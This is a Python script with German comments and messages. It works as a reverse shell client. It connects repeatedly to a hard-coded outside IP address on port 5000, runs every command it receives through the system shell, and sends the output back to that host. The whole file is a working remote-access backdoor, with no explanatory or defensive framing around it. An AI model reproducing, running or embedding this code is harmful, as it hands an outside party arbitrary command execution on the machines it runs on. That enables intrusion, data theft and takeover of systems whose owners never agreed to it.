import socket
import subprocess
import time
import sys

SERVER_HOST = '193.111.248.212'  # Ändere dies zur Server-IP
SERVER_PORT = 5000        # Ändere dies zum Server-Port

def execute_command(command):
    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

def connect_to_server():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_HOST, SERVER_PORT))
                print(f"Verbunden mit {SERVER_HOST}:{SERVER_PORT}")
                
                while True:
                    command = s.recv(1024).decode('utf-8')
                    if not command:
                        break
                    print(f"Empfangener Befehl: {command}")
                    output = execute_command(command)
                    s.sendall(output.encode('utf-8'))
        except (ConnectionRefusedError, ConnectionResetError) as e:
            print(f"Verbindungsfehler: {e}. Erneuter Versuch in 5 Sekunden...")
            time.sleep(5)
        except Exception as e:
            print(f"Fehler: {e}. Erneuter Versuch in 5 Sekunden...")
            time.sleep(5)

if __name__ == "__main__":
    connect_to_server()